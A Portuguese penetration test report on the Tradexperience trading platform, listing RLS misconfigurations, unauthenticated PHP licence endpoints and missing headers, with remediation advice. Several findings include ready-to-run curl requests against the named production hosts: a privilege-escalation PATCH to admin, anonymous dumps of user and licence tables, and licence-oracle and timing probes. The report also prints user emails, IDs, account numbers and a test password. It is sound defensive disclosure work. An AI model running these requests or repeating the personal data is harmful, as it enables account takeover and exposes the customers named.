# Tradexperience WebApp — Relatório de Pentest (Gray-Box, Read-Only)

**Data do teste:** 2026-04-17
**Alvo:** Produção — `https://armhlcnmaqgudqivkpgt.supabase.co`, `https://api.tradexperience.com.br`, `https://app.tradexperience.com.br`
**Modo:** Gray-box. Credencial de client comum fornecida (`sk8.del@gmail.com`).
**Escopo:** Somente leitura. Nenhum `UPDATE`, `INSERT`, `DELETE` foi executado.
**Referência metodológica:** `RULES.md` §10 (STRIDE, Exhaustive Review, Offensive Review Rules).

> **AVISO.** Este documento é a fase de **descoberta**. Ele lista achados, evidências e recomendações conceituais de remediação. Os patches concretos (alteração de policies RLS, autenticação dos PHPs, headers) devem ser planejados em um `PLAN.md` separado, priorizado por severidade.

---

## Sumário Executivo

| Severidade | Quantidade |
|---|---|
| **CRÍTICO** | **4** |
| **ALTO** | **4** |
| **MÉDIO** | **5** |
| **BAIXO** | **1** |
| Mitigações já presentes | 2 |

**Estado geral:** **A plataforma está atualmente em condição inadequada para operar com dados sensíveis de clientes.** Qualquer pessoa com acesso à internet e à anon key pública (que também está exposta no bundle frontend e em 3 arquivos PHP versionados no git) é capaz de:

1. Listar todos os 19 usuários com email, nome, role, data de último login (C-02).
2. Listar todas as 26+ licenças MT5 com número da conta e data de expiração de cada cliente (C-03).
3. Identificar quais contas pertencem ao admin, quais estão prestes a expirar, e mapear clientes para ataque direcionado.

Com uma conta comum de cliente, **adicionalmente** é possível (em tese, por análise da policy RLS) elevar o próprio privilégio para `admin` (C-01). A prova ativa exigiria um `UPDATE`, fora do escopo read-only acordado.

---

## STRIDE

| Categoria | Achados |
|---|---|
| **S**poofing | C-04 (JWT anon em múltiplos lugares), A-04 (sem rate limit login), M-02 (senha fraca aceita) |
| **T**ampering | C-01 (privilege escalation via policy `profiles UPDATE`), M-05 (upload sem MIME check) |
| **R**epudiation | Ausência de `license_logs`, `audit_trail` (tabela não existe) — nenhum registro de tentativas de bypass |
| **I**nformation Disclosure | **C-02, C-03**, C-04, A-03, M-01, M-03 |
| **D**enial of Service | A-01 (endpoints PHP sem rate limit, qualquer método HTTP aceito) |
| **E**levation of Privilege | **C-01** (self-update de `role`), A-03 (conta hardcoded como "válida") |

---

## Achados Detalhados

---

### 🔴 C-01 · Privilege Escalation via RLS permissiva em `profiles`

| Campo | Valor |
|---|---|
| Severidade | **CRÍTICO (9.8 CVSS-like)** |
| STRIDE | Elevation of Privilege / Tampering |
| Estado | **Confirmado por análise estática.** Não executado (exigiria write). |
| Local | [supabase_schema_complete.sql:25-26](supabase_schema_complete.sql#L25-L26), [supabase_schema.sql:21-22](supabase_schema.sql#L21-L22) |

**Descrição.** A policy `UPDATE` em `profiles` é:

```sql
create policy "Users can update own profile." on public.profiles
  for update using (auth.uid() = id);
```

Ela permite que qualquer usuário atualize **sua própria linha**, mas **sem restringir colunas**. A coluna `role` (`admin|client|partner|first_mate`) faz parte dessa linha. Consequentemente, qualquer cliente autenticado pode emitir:

```http
PATCH /rest/v1/profiles?id=eq.<SEU_UUID>
apikey: <anon>
Authorization: Bearer <JWT_DO_CLIENT>
Content-Type: application/json
Prefer: return=representation

{"role":"admin"}
```

e se tornar `admin` global. A partir daí, o gate do frontend em [App.tsx:154-158](App.tsx#L154-L158) libera o AdminPanel, e todas as queries privilegiadas (ver/editar qualquer licença, qualquer usuário, deletar contas, newsletter etc.) passam a funcionar porque outras policies checam `profiles.role = 'admin'` do próprio atacante recém-elevado.

**Impacto.**
- Qualquer signup público (`/signup`) vira admin em 1 request.
- Deleção em massa de licenças, profiles, partner_requests — código em [AdminPanel.tsx:527-529](components/Admin/AdminPanel.tsx#L527-L529) executa esses DELETEs diretamente do cliente.
- Roubo de dados de todos os tenants (AFK, Snow Ball, Boleta Pro).

**Prova viva (NÃO executada).** O comando abaixo seria a prova. Conforme escopo read-only, não foi rodado.

```bash
curl -X PATCH "https://armhlcnmaqgudqivkpgt.supabase.co/rest/v1/profiles?id=eq.fe659a4a-f537-43ac-a899-9c9f51d94213" \
  -H "apikey: <ANON>" -H "Authorization: Bearer <JWT_CLIENT>" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

**Remediação conceitual.**

1. Substituir a policy de UPDATE por uma que impeça mutação de `role` (e `id`, `created_at`). Opção mais robusta: usar `WITH CHECK` comparando valores antigo e novo, ou dividir em duas policies — uma "update self fields" (sem role) e outra "admin-only role change".
2. Mover a autoridade sobre `role` para o backend (trigger + `security definer` function validando ator) ou JWT `app_metadata.role` imutável pelo cliente.
3. Criar auditoria (`audit_profile_changes`) com trigger que grava toda alteração em `role`.
4. Adicionar teste de regressão: um client tenta patch em `role` → deve falhar.

---

### 🔴 C-02 · PII de todos os usuários exposta (policy `SELECT USING (true)`)

| Campo | Valor |
|---|---|
| Severidade | **CRÍTICO (9.1)** |
| STRIDE | Information Disclosure |
| Estado | **Provado em produção.** |
| Local | [supabase_schema_complete.sql:19-20](supabase_schema_complete.sql#L19-L20), [supabase_schema.sql:15-16](supabase_schema.sql#L15-L16) |

**Descrição.** A tabela `profiles` tem a policy:

```sql
create policy "Public profiles are viewable by everyone." on public.profiles
  for select using (true);
```

Qualquer sessão — **inclusive anônima com apenas a anon key pública** — lê a tabela inteira.

**Prova.**

```bash
# Como client autenticado sk8.del@gmail.com
curl "https://armhlcnmaqgudqivkpgt.supabase.co/rest/v1/profiles?select=*&limit=5" \
  -H "apikey: $ANON" -H "Authorization: Bearer $JWT"
```

Saída (recortada — **dados reais de produção**):

```json
[{"id":"97474b4c-4b12-486b-9180-0410a5fa5f10","full_name":"delnoinsta",
  "role":"admin","mt5_account":null,
  "email":"delnoinsta@gmail.com","last_login":"2026-04-17T14:47:23.108+00:00"},
 {"id":"d1d3166b-7128-41fc-aa58-6d4e9f7bbb49","full_name":"AFK Trader",
  "role":"partner","email":"tradexperience.br@gmail.com", ...},
 ...]
```

Count total retornado via `Content-Range: 0-18/19` → **19 usuários expostos**.

```bash
# Mesmo resultado SEM JWT, só com a anon key pública (exposta em .env e nos PHPs)
curl "https://armhlcnmaqgudqivkpgt.supabase.co/rest/v1/profiles?select=*" \
  -H "apikey: $ANON"
# HTTP 200 + 19 registros
```

**Impacto.**
- Email do administrador (`delnoinsta@gmail.com`) exposto globalmente → permite spear phishing, credential stuffing direcionado, reset de senha se houver fraqueza nesse fluxo.
- Role de cada conta visível → atacante sabe exatamente quais emails atacar para elevação de privilégio.
- `last_login` revela usuários inativos (alvos para takeover).
- Conformidade: provável violação LGPD (dados pessoais de titulares expostos sem base legal).

**Remediação conceitual.**

1. Substituir `SELECT USING (true)` por policies escopadas:
   - Usuário lê apenas a própria linha: `USING (auth.uid() = id)`.
   - Admin lê todas: subquery ou claim JWT.
   - Se o app precisa de `full_name` público para partners/autores, criar **view** `public_profiles(id, full_name)` sem email/role/last_login.
2. Revisar TODO código que depende do SELECT aberto (ex.: join `profiles:user_id (full_name, email)` em [AdminPanel.tsx:171](components/Admin/AdminPanel.tsx#L171)) e garantir que admins continuam autorizados pela nova policy.

---

### 🔴 C-03 · Licenças MT5 de todos os clientes expostas **a qualquer atacante anônimo**

| Campo | Valor |
|---|---|
| Severidade | **CRÍTICO (9.4)** |
| STRIDE | Information Disclosure |
| Estado | **Provado em produção sem autenticação.** |
| Local | Schema de `license_requests`, `license_requests_snowball`, `license_requests_boletapro` — nenhum arquivo SQL no repo declara política de `SELECT` que restrinja leitura a `auth.uid() = user_id` E ao mesmo tempo proíba anon. A policy existente é permissiva demais. |

**Descrição.** O endpoint PostgREST retorna dados das 3 tabelas de licenças para requisições feitas apenas com a anon key — **sem `Authorization` de usuário**:

```bash
curl "https://armhlcnmaqgudqivkpgt.supabase.co/rest/v1/license_requests?select=id,user_id,mt5_account,status,expires_at" \
  -H "apikey: $ANON"
```

Saída real (recortada):

```json
[{"user_id":"97474b4c...","mt5_account":"37233454","status":"approved","expires_at":"2028-03-01"},
 {"user_id":"97474b4c...","mt5_account":"19118022","expires_at":"2027-03-31"},
 {"user_id":"97474b4c...","mt5_account":"221976","expires_at":"2019-02-26"},
 ...26 linhas...]
```

`license_requests_snowball` e `license_requests_boletapro` respondem da mesma forma.

**Impacto.**
- **Todas as contas MT5** dos clientes são públicas.
- `expires_at` revela quando cada licença vence → atacante pode alertar o concorrente, oferecer produto concorrente em janela exata, ou vender a lista.
- `user_id` + tabela `profiles` (C-02) → mapeia cada conta MT5 ao email do cliente.
- Quebra total da promessa "Proteção de IP / Multi-Base" do `ROADMAP.md`.

**Remediação conceitual.**

1. Policy de SELECT: `USING (auth.uid() = user_id)` para client, + policy admin separada.
2. Garantir que RLS esteja **habilitada** nas 3 tabelas (`alter table … enable row level security`). O schema só mostra habilitação em `license_requests`, não nas duplicatas `_snowball` e `_boletapro`.
3. Nunca mais permitir leitura com role `anon`: a primeira checagem da policy deve referir `auth.role() = 'authenticated'`.
4. Os PHPs MT5 não precisam ler pela anon key — devem usar a **service_role** no backend (nunca no bundle), ou uma função RPC `security definer` com assinatura HMAC.

---

### 🔴 C-04 · Anon key JWT **versionada no Git** em múltiplos arquivos

| Campo | Valor |
|---|---|
| Severidade | **CRÍTICO (8.5)** — ampliador dos demais |
| STRIDE | Spoofing / Information Disclosure |
| Estado | **Provado** (recon estático). |
| Local | [.env:2](.env#L2), [php_api/validate_boleta.php:9](php_api/validate_boleta.php#L9), [php_api/validate_snowball.php:9](php_api/validate_snowball.php#L9), [php_api/validate_afk.php:9](php_api/validate_afk.php#L9) |

**Descrição.** A JWT `eyJ…8xs` aparece hardcoded em 4 locais. Decodificação do payload:

```json
{"iss":"supabase","ref":"armhlcnmaqgudqivkpgt","role":"anon",
 "iat":1769479387, "exp":2085055387}
```

`exp` = **2036-05-07** (≈ 10 anos). Irrevogável sem regenerar as chaves do projeto Supabase inteiro.

**Impacto.** Por si só a anon key foi projetada para ser pública (é incluída no bundle JS dos SPAs Supabase) **desde que** as policies RLS protejam os dados. No Tradexperience, **as policies não protegem** (C-02, C-03), portanto a anon key vira a chave-mestre: qualquer pessoa que inspecione o bundle do `app.tradexperience.com.br` ou clone o repositório git obtém acesso imediato aos dados críticos.

**Remediação conceitual.**

1. **Prioridade #1: corrigir C-01, C-02, C-03** antes de pensar em rotacionar a chave — a rotação sem corrigir as policies apenas atrasa o ataque.
2. Após policies corrigidas: rotacionar a anon key no dashboard Supabase.
3. Remover o hardcode dos PHPs — usar a **service_role** key lida de variável de ambiente do servidor PHP (nunca do código).
4. Adicionar `.env` ao `.gitignore` e purgar do histórico via `git filter-repo` (lembrar que a chave **já vazou**, rotação é mandatória).

---

### 🟠 A-01 · Endpoints PHP sem autenticação, sem rate limit, aceitando todos os métodos HTTP

| Campo | Valor |
|---|---|
| Severidade | **ALTO (7.5)** |
| STRIDE | Spoofing / DoS / Tampering |
| Estado | **Provado.** |
| Local | `https://api.tradexperience.com.br/ealicensesbeta.php`, `/validate_snowball.php`, `/validate_boleta.php` · [php_api/validate_afk.php](php_api/validate_afk.php) |

**Descrição.** Cada endpoint recebe `account_no` via GET/POST/body e responde `"success"` ou `"Falha no login. Conta nao encontrada."`. Não há API key, HMAC, origin check, nonce, ou qualquer mecanismo de autenticação da EA cliente. Qualquer script pode consultar a base de licenças da plataforma.

**Prova.**

```bash
for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  curl -o /dev/null -w "$m=%{http_code}\n" -X $m \
    "https://api.tradexperience.com.br/ealicensesbeta.php?account_no=221976"
done
# GET=200  POST=200  PUT=200  DELETE=200  PATCH=200  OPTIONS=200  HEAD=200
```

Todos os métodos são processados como GET (PHP padrão). Não há CORS (`Access-Control-Allow-Origin` ausente nos responses do endpoint). Testamos 10 requisições consecutivas sem bloqueio. Cabeçalho leak: `X-Powered-By: PHP/8.1.34` (M-03).

**Impacto.**
- Atacante verifica se qualquer conta MT5 do mundo tem licença no Tradexperience (oráculo público de propriedade intelectual comercial).
- Combinado com C-03, permite validação em massa do universo de clientes.
- DoS trivial — sem rate limit.

**Remediação conceitual.**

1. Exigir HMAC por request: `X-Signature = HMAC-SHA256(secret, timestamp + account_no)` com janela de 60s. A chave HMAC fica compilada no EA (MT5 `.ex5` — ofuscada), e no servidor PHP.
2. Whitelist de método: só `POST` (ou só `GET`).
3. Rate limit por IP no nível Cloudflare (já está no path — basta ligar regra WAF).
4. Remover `expose_php` no `php.ini` ou enviar `header_remove('X-Powered-By')`.
5. Considerar mover esses endpoints para Supabase Edge Function (rust/deno) com assinatura embutida.

---

### 🟠 A-02 · Enumeração de licenças via timing attack

| Campo | Valor |
|---|---|
| Severidade | **ALTO (7.0)** |
| STRIDE | Information Disclosure |
| Estado | **Provado.** |
| Local | [php_api/validate_afk.php:47-87](php_api/validate_afk.php#L47-L87) |

**Descrição.** O fluxo do PHP é:

1. Se `account_no` está no array local hardcoded → responde em ~50ms (sem ir à rede).
2. Se não está → chama Supabase via cURL (latência real → ~170-340ms).
3. Se Supabase não acha → mesma mensagem "Conta nao encontrada", mas com atraso acumulado.

Ambos os caminhos retornam **o mesmo corpo de erro** → mitigação aparente de enumeração. Mas o **tempo** os distingue.

**Prova.**

```
account_no=0         → time 0.086s / 0.091s / 0.056s   (invalid, short-circuit)
account_no=221976    → time 0.091s / 0.048s / 0.047s   (local hardcoded, short-circuit)
account_no=37233454  → time 0.338s / 0.176s / 0.166s   (DB real approved)
```

Diferencial ~2-4×. Com 10 amostras por conta, significância estatística é trivial.

**Impacto.** Atacante com lista de contas MT5 (obtida de qualquer corretora brasileira que vaze faixas) cruza-a contra o endpoint e identifica quais pertencem ao Tradexperience, sem jamais obter um `success` explícito.

**Remediação conceitual.**

1. Igualar o tempo de resposta: sempre aguardar `usleep()` até um mínimo (ex.: 400ms) antes de responder.
2. Ou, melhor: exigir auth (A-01) — se o atacante precisa de HMAC válida, o timing para de importar.

---

### 🟠 A-03 · Conta MT5 hardcoded como válida ("backdoor de IP")

| Campo | Valor |
|---|---|
| Severidade | **ALTO (7.5)** |
| STRIDE | Elevation of Privilege |
| Estado | **Provado.** |
| Local | [php_api/validate_afk.php:31-33](php_api/validate_afk.php#L31-L33) |

**Descrição.** O array `$valid_accounts` contém:

```php
$valid_accounts = array(
    array(221976, '2034-08-31'),
);
```

**Prova.**

```bash
curl "https://api.tradexperience.com.br/ealicensesbeta.php?account_no=221976"
# success
```

Funciona até 2034 independentemente do Supabase.

**Impacto.** Qualquer pessoa com acesso ao repositório git público ou privado (desenvolvedores, ex-colaboradores, vazamento de source) obtém uma licença válida perpétua. A conta `221976` também aparece em `license_requests` do usuário `97474b4c…` (admin) — provavelmente é a conta pessoal do admin, o que **piora** o risco: uma vez que o atacante sabe disso, pode clonar a conta (conceitualmente) no MT5 e rodar os EAs.

**Remediação conceitual.**

1. Remover o array `$valid_accounts` — toda verificação deve ir ao DB.
2. Se precisar de allowlist de contas "grandfathered", migrar para uma tabela `legacy_accounts` com RLS estrita (ou coluna booleana `is_legacy` em `license_requests`).
3. Auditar histórico do git para ver todas as contas que passaram por esse array.

---

### 🟠 A-04 · Login sem rate limit / sem CAPTCHA / senhas fracas aceitas

| Campo | Valor |
|---|---|
| Severidade | **ALTO (7.0)** |
| STRIDE | Spoofing |
| Estado | **Provado.** |
| Local | Configuração de autenticação Supabase + frontend [components/Auth/Login.tsx](components/Auth/Login.tsx) |

**Descrição.** Executamos 10 tentativas consecutivas de login com senha errada contra `sk8.del@gmail.com`. Nenhuma foi bloqueada, nem houve CAPTCHA, nem 429. Senha atual do usuário (`123456`) foi aceita sem qualquer checagem de força mínima no signup.

**Prova.** Ver bloco "=== 2. BRUTE FORCE ===" no apêndice.

**Impacto.** Atacante pode tentar credential-stuffing contra qualquer email vazado em C-02 (incluindo `delnoinsta@gmail.com`, o admin) com alta taxa de requests/s. Com privilege escalation via C-01, basta conseguir **qualquer** conta válida, mesmo de um client.

**Remediação conceitual.**

1. Ativar rate limit + CAPTCHA no dashboard Supabase (Auth → Rate Limits).
2. Configurar política de senhas (min 10 chars, complexidade) no Supabase Auth.
3. 2FA obrigatória para role=`admin` (primeiro passo: TOTP via Supabase).
4. Alertas de "login from new device" para admins.

---

### 🟡 M-01 · Ausência de headers de segurança (CSP, XFO, XCTO, Referrer-Policy)

| Campo | Valor |
|---|---|
| Severidade | **MÉDIO (5.5)** |
| STRIDE | Information Disclosure / Tampering |
| Estado | **Provado.** |
| Local | Hosting Vercel de `app.tradexperience.com.br` e `tradexperience.com.br` |

**Descrição.** Response `HEAD /` contém apenas `Strict-Transport-Security: max-age=63072000` e `Access-Control-Allow-Origin: *`. Faltam:

- `Content-Security-Policy`
- `X-Frame-Options: DENY` (ou `frame-ancestors` na CSP)
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy`

**Impacto.** Clickjacking (iframe hostil), sniffing de MIME, leak de referer para terceiros, maior superfície para XSS caso surja.

**Remediação conceitual.** Adicionar `headers` em `vercel.json`:

```json
{
  "headers": [
    { "source": "/(.*)", "headers": [
      { "key": "Content-Security-Policy", "value": "default-src 'self'; ..." },
      { "key": "X-Frame-Options", "value": "DENY" },
      { "key": "X-Content-Type-Options", "value": "nosniff" },
      { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" }
    ]}
  ]
}
```

---

### 🟡 M-02 · Política de senha fraca aceita no signup

| Campo | Valor |
|---|---|
| Severidade | **MÉDIO (5.0)** |
| STRIDE | Spoofing |
| Estado | **Provado.** |

**Descrição.** A conta de teste `sk8.del@gmail.com` usa senha `123456`. Supabase Auth aceitou esse valor no signup sem avisar. Combinado com C-01 (privilege escalation), qualquer senha adivinhada destrava um admin.

**Remediação.** Dashboard Supabase → Auth → Password Policy → min 10 chars + misto obrigatório. No frontend ([components/Auth/Login.tsx](components/Auth/Login.tsx)), mostrar força da senha antes do submit.

---

### 🟡 M-03 · Version disclosure via `X-Powered-By: PHP/8.1.34`

| Campo | Valor |
|---|---|
| Severidade | **MÉDIO (4.0)** |
| STRIDE | Information Disclosure |
| Estado | **Provado.** |

**Remediação.** No `php.ini`: `expose_php = Off`. Ou, no topo dos PHPs: `header_remove('X-Powered-By');`.

---

### 🟡 M-04 · Sem 2FA para role=admin

| Campo | Valor |
|---|---|
| Severidade | **MÉDIO (5.5)** |
| STRIDE | Spoofing |
| Estado | Análise estática — nenhum `enrollFactor`/`mfa` no código. |
| Local | [contexts/AuthContext.tsx](contexts/AuthContext.tsx), [components/Auth/Login.tsx](components/Auth/Login.tsx) |

**Remediação.** Ativar `auth.mfa` no Supabase. Forçar enrollment para `profiles.role = 'admin'` no primeiro login.

---

### 🟡 M-05 · Upload sem validação server-side de MIME/extensão

| Campo | Valor |
|---|---|
| Severidade | **MÉDIO (4.5)** |
| STRIDE | Tampering |
| Estado | Análise estática. |
| Local | [lib/storage.ts:52-78](lib/storage.ts#L52-L78) |

**Descrição.** O upload aceita qualquer `File`, e usa `file.type` do cliente (que pode ser forjado). Não há checagem de magic bytes nem whitelist de extensões.

**Remediação.** Criar Supabase Edge Function que valide o MIME via magic bytes (primeiros 4-8 bytes) antes de aceitar o upload. Ou usar `storage.objects` com policy RLS que limite tamanho e extensão via regex.

---

### 🔵 L-01 · `Access-Control-Allow-Origin: *` no host principal (Vercel default)

| Campo | Valor |
|---|---|
| Severidade | **BAIXO (3.0)** |
| STRIDE | Information Disclosure |
| Estado | **Provado.** Default Vercel para estáticos. |

**Remediação.** Restringir origins no `vercel.json` se houver qualquer API custom no domínio. Para servir só HTML/JS público, o risco é baixo.

---

## Mitigações já presentes (não alterar, são positivas)

| # | Descrição |
|---|---|
| ✅ | **Sem `dangerouslySetInnerHTML` em todo o código do app.** XSS armazenado em conteúdo de artigos/prospects é mitigado por rendering como texto. Grep confirmou zero ocorrências em `components/**` e `lib/**`. |
| ✅ | **Login não enumera usuários por mensagem.** Supabase responde sempre `"Invalid login credentials"` para email inexistente ou senha errada. |
| ✅ | **HTTPS com HSTS** (`max-age=63072000`) ativo no frontend. |
| ✅ | **PHP cast `(int)$account_no`** neutraliza SQL injection clássica no regex. |

---

## Plano de Priorização Recomendado

| Ordem | Bloco | Achados | Esforço |
|---|---|---|---|
| 1 | **Fechar PostgREST público** | C-01, C-02, C-03 | Médio (reescrever RLS de 4 tabelas + testes) |
| 2 | **Proteger PHPs MT5** | A-01, A-02, A-03, M-03 | Médio (HMAC + rate limit Cloudflare + remover hardcode) |
| 3 | **Rotacionar secrets e purgar git** | C-04 | Alto (rotação quebra EAs em produção — coordenar release) |
| 4 | **Headers Vercel + password policy + 2FA admin** | M-01, M-02, M-04, A-04, L-01 | Baixo (config dashboard + `vercel.json`) |
| 5 | **Hardening de upload** | M-05 | Baixo |

---

## Apêndice A — Ambiente e credenciais usadas

```
Supabase URL     : https://armhlcnmaqgudqivkpgt.supabase.co
Anon JWT         : eyJ…8xs   (exp 2036-05-07)
PHP endpoints    : https://api.tradexperience.com.br/{ealicensesbeta,validate_snowball,validate_boleta}.php
Frontend         : https://app.tradexperience.com.br
Client user      : sk8.del@gmail.com  (UUID fe659a4a-f537-43ac-a899-9c9f51d94213, role=client)
Admin observado  : delnoinsta@gmail.com (UUID 97474b4c-4b12-486b-9180-0410a5fa5f10)
```

## Apêndice B — Logs brutos selecionados

### B.1 Enumeração anônima de tabelas

```
profiles                    HTTP=200 len=403    (19 registros)
prospects                   HTTP=200 len=2      (tabela vazia ou RLS)
partner_links               HTTP=200 len=2
newsletter                  HTTP=404            (tabela não existe)
downloads                   HTTP=200 len=2
treasury_accounts           HTTP=200 len=2
license_titles              HTTP=200 len=2
license_requests            HTTP=200 len=625    (dados reais)
license_requests_snowball   HTTP=200 len=574    (dados reais)
license_requests_boletapro  HTTP=200 len=600    (dados reais)
marketing_assets            HTTP=200 len=2
articles                    HTTP=200 len=516
modules                     HTTP=200 len=360
lessons                     HTTP=200 len=595
products                    HTTP=200 len=1903
partner_requests            HTTP=200 len=2
notifications               HTTP=200 len=2
broadcasts                  HTTP=200 len=2
```

### B.2 Timing attack PHP

```
invalid_0        0.086s / 0.091s / 0.056s
local_221976     0.091s / 0.048s / 0.047s
db_37233454      0.338s / 0.176s / 0.166s
```

### B.3 Brute force login (10 tentativas, sem lockout)

```
attempt 1..10 => HTTP=400 invalid_credentials, times 0.15s-0.40s, sem 429 em nenhum
```

### B.4 Métodos HTTP em `ealicensesbeta.php`

```
GET=200  POST=200  PUT=200  DELETE=200  PATCH=200  OPTIONS=200  HEAD=200
```

### B.5 Headers do endpoint PHP (parcial)

```
Server: cloudflare
x-powered-by: PHP/8.1.34
Content-Type: text/html; charset=UTF-8
(sem Access-Control-Allow-Origin, sem X-Frame-Options, sem CSP)
```

### B.6 Headers do app (Vercel)

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Server: Vercel
Strict-Transport-Security: max-age=63072000
(sem CSP, XFO, XCTO, Referrer-Policy, Permissions-Policy)
```

---

**Fim do relatório.** Próximo passo recomendado: abrir `PLAN.md` com Waves de remediação na ordem do Plano de Priorização acima, começando por C-01/C-02/C-03 (todos fixáveis via policies SQL — baixo risco de regressão no core do projeto).
